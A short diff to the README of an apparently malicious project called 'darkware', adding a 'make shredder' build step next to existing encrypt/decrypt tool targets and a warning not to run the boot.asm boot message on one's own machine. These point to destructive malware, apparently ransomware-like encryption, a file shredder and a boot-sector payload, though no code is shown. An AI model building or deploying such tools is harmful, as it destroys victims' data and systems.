@@ -9,5 +9,7 @@ git clone git@gitlab.com:BL4CKS3C/darkware.git && cd shreder && make
 
 ## How to:
 ###### make darkwarenc && make darkwardec : generate encrypt/decrypt tool
-###### Boot msg is in boot.asm file you can change it but be careful don't run it in ur machine !!!!
+###### make shredder : generate shredder 
+## WARNING:
+##### Boot msg is in boot.asm file you can change it but be careful don't run it in ur machine !!!!
 
